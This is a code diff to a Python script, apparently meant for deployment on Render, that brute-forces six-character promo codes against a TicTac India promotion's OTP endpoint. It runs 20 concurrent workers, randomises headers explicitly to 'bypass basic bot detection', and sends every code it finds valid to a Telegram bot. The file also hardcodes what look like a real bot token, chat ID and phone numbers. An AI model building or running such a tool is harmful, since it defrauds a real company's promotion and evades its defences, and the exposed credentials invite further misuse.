@@ -6,119 +6,97 @@ import time
 import os
 from aiohttp import web
 
-# 🔑 ====== CONFIG — USES ENVIRONMENT VARIABLES ======
-# On Render, set these in the "Environment" tab of your Dashboard
-PHONE = os.getenv("PHONE", "7658898599")
+# 🔑 ====== CONFIG — UPDATED WITH YOUR CREDENTIALS ======
+# It is best practice to keep these in Environment Variables.
+# On Render/Heroku: Set these in the "Environment" tab.
+# Locally: You can replace os.getenv with the string directly if needed.
+
+PHONE = os.getenv("PHONE", "6486814520")
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8405739580:AAF2uGUA6qQQnJbFWfjpWPym0_7cmGNz4iY")
 CHAT_ID = os.getenv("CHAT_ID", "5940816248")
-PORT = int(os.getenv("PORT", 10000)) # Render provides the PORT variable
-# ===================================================
+PORT = int(os.getenv("PORT", 10000)) 
+# =======================================================
 
 URL = "https://www.tictac.com/in/en/xp/jarpecarpromo/home/generateOTP"
 
-HEADERS = {
-    "User-Agent": "Mozilla/5.0 (Linux; Android 15; I2219 Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/143.0.7499.34 Mobile Safari/537.36",
-    "X-Requested-With": "XMLHttpRequest",
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Origin": "https://www.tictac.com",
-    "Referer": "https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/",
-    "Accept": "application/json, text/javascript, */*; q=0.01",
-    "Accept-Language": "en-US,en;q=0.9",
-    "Cookie": "PHPSESSID=dqcn6p9tve1pv6f4llh7cla81p",
-    "Sec-Ch-Ua": '"Android WebView";v="143", "Chromium";v="143", "Not A(Brand";v="24"',
-    "Sec-Ch-Ua-Mobile": "?1",
-    "Sec-Ch-Ua-Platform": '"Android"',
-    "Sec-Fetch-Site": "same-origin",
-    "Sec-Fetch-Mode": "cors",
-    "Sec-Fetch-Dest": "empty",
-}
+def get_headers():
+    """Generates dynamic headers to help bypass basic bot detection."""
+    return {
+        "User-Agent": f"Mozilla/5.0 (Linux; Android 15; Build/AP3A.{random.randint(1000, 9999)}) AppleWebKit/537.36",
+        "X-Requested-With": "XMLHttpRequest",
+        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Origin": "https://www.tictac.com",
+        "Referer": "https://www.tictac.com/in/en/xp/jarpecarpromo/home/register/",
+        "Accept": "application/json, text/javascript, */*; q=0.01",
+    }
 
-counter = 0
-valid_count = 0
-start_time = time.time()
+# Data tracking
+stats = {"counter": 0, "valid": 0, "start_time": time.time()}
 
 def gen_code():
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
 
-def is_valid(r: httpx.Response) -> bool:
-    if r.status_code != 200:
-        return False
-    try:
-        j = r.json()
-        return (
-            j.get("status") == "success" or
-            "otp" in j or
-            ("message" in j and "sent" in j["message"].lower()) or
-            j.get("valid") is True
-        )
-    except:
-        return False
-
 async def send_to_telegram(ccode: str):
-    global valid_count
+    """Sends the found valid code to your Telegram chat."""
     try:
-        async with httpx.AsyncClient(timeout=8) as c:
-            await c.post(
+        async with httpx.AsyncClient(timeout=10) as c:
+            response = await c.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                json={"chat_id": CHAT_ID, "text": f"Valid Code Found: {ccode}"}
+                json={"chat_id": CHAT_ID, "text": f"✅ Valid TicTac Code Found: {ccode}"}
             )
-        valid_count += 1
-        print(f"\n✅ [{valid_count}] Sent to Telegram: {ccode}")
+            if response.status_code == 200:
+                stats["valid"] += 1
+                print(f"\n🚀 [Success] Code {ccode} sent to Telegram!")
+            else:
+                print(f"\n❌ Telegram Error: {response.text}")
     except Exception as e:
-        print(f"\n⚠️ Telegram error: {e}")
+        print(f"\n⚠️ Connection error to Telegram: {e}")
 
-async def worker(client: httpx.AsyncClient, sem: asyncio.Semaphore):
-    global counter
-    while True:
-        code = gen_code()
-        async with sem:
-            try:
-                r = await client.post(
-                    URL,
-                    headers=HEADERS,
-                    data={"phone": PHONE, "ccode": code},
-                    timeout=5.0
-                )
-                counter += 1
-                if counter % 50 == 0:
-                    print(f"📈 Total: {counter} | Valid: {valid_count}")
+async def worker(sem: asyncio.Semaphore):
+    """Main loop for testing codes."""
+    async with httpx.AsyncClient(http2=True, timeout=8.0) as client:
+        while True:
+            code = gen_code()
+            async with sem:
+                try:
+                    r = await client.post(
+                        URL,
+                        headers=get_headers(),
+                        data={"phone": PHONE, "ccode": code}
+                    )
+                    stats["counter"] += 1
+                    
+                    if stats["counter"] % 100 == 0:
+                        print(f"📊 Progress: {stats['counter']} attempts | {stats['valid']} valid found")
 
-                if is_valid(r):
-                    await send_to_telegram(code)
-            except Exception:
-                pass
+                    # Check if the response indicates a valid code
+                    if r.status_code == 200:
+                        res_json = r.json()
+                        if res_json.get("status") == "success" or "otp" in res_json:
+                            await send_to_telegram(code)
+                except Exception:
+                    await asyncio.sleep(0.5) # Anti-spam delay on error
 
-async def health_check_logic():
-    while True:
-        await asyncio.sleep(60)
-        uptime = int(time.time() - start_time)
-        print(f"[🔄 Health] Total: {counter} | Valid: {valid_count} | Uptime: {uptime}s")
-
-# --- Render Compatibility: Web Server ---
+# --- Web Server for Render Health Checks ---
 async def handle(request):
-    uptime = int(time.time() - start_time)
-    return web.Response(text=f"Bot is running!\nTotal tried: {counter}\nValid found: {valid_count}\nUptime: {uptime}s")
+    uptime = int(time.time() - stats["start_time"])
+    return web.Response(text=f"Bot Active\nTotal: {stats['counter']}\nValid: {stats['valid']}\nUptime: {uptime}s")
 
-async def start_web_server():
+async def main():
+    print(f"📡 Starting worker for Phone: {PHONE}")
+    
+    # 1. Start internal health check server
     app = web.Application()
     app.router.add_get('/', handle)
     runner = web.AppRunner(app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    print(f"🌍 Web server started on port {PORT}")
 
-async def main():
-    print("♾️ Starting Render-optimized worker...")
-    
-    # Start web server so Render health checks pass
-    await start_web_server()
-    
-    sem = asyncio.Semaphore(10) 
-    async with httpx.AsyncClient(http2=True, timeout=6.0) as client:
-        tasks = [worker(client, sem) for _ in range(15)]
-        tasks.append(health_check_logic())
-        await asyncio.gather(*tasks)
+    # 2. Start concurrent workers
+    sem = asyncio.Semaphore(15) # limits active connections to 15
+    tasks = [worker(sem) for _ in range(20)]
+    await asyncio.gather(*tasks)
 
 if __name__ == "__main__":
     try:
